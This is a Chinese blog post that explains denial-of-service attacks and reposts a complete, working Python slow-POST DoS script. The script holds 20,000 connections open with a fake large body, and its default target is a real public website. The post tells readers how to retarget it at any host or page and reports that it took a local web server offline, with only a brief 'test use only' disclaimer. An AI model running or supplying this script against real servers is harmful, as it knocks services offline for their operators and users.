# ﻿dos攻击原理及攻击实例（带脚本）
发表于2017/1/3 22:57:36  60人阅读
分类： 网络供给与防御

首先声明，以下仅作为测试用，请勿作为非法用途。
dos攻击原理：DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。（百度百科说的，大概就是这么个意思）。
dos攻击与ddos攻击的区别就是，它是一对一的攻击，而ddos是分布式的攻击，作为入门，作为菜鸟，我们他妈哪里有那么多肉鸡给你用。。。所以不过对付一些带宽小，内存低，cpu渣的小型web服务器还是ok的。
现在，废话不多说，本地搭建一个web站点测试一下。
测试地址：http://192.168.1.110/cloudmanage/admin.php#（本地的）
测试脚本：网上一堆。给大家转载一个，如下:
```python
#!/usr/bin/env python
import socket
import time
import threading
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=20000
PORT=80
HOST="www.baidu.com"
PAGE="/index.php"
#---------------------------

buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]

def conn_thread():
	global socks
	for i in range(0,MAX_CONN):
		s=socket.socket	(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((HOST,PORT))
			s.send(buf)
			print "Send buf OK!,conn=%d\n"%i
			socks.append(s)
		except Exception,ex:
			print "Could not connect to server or send error:%s"%ex
			time.sleep(10)
#end def

def send_thread():
	global socks
	while True:
		for s in socks:
			try:
				s.send("f")
				#print "send OK!"
			except Exception,ex:
				print "Send Exception:%s\n"%ex
				socks.remove(s)
				s.close()
		time.sleep(1)
#end def

conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()
```
脚本来源是：http://blog.csdn.net/jeepxiaozi/article/details/8799684
以上是一个python脚本。
HOST="www.baidu.com"
PAGE="/index.php"
我们要改的是这两处地方
改为：
HOST=“192.168.1.110”//你要撸的主机ip地址/域名
PAGE=“/cloudmanage/admin.php”//你要撸的页面
cmd命令行下执行脚本
刷刷刷，一连串socket连接。。。就开着呗。我们来看看现在网页还可以访问不？
显然被日瘫了。
别搞事情！


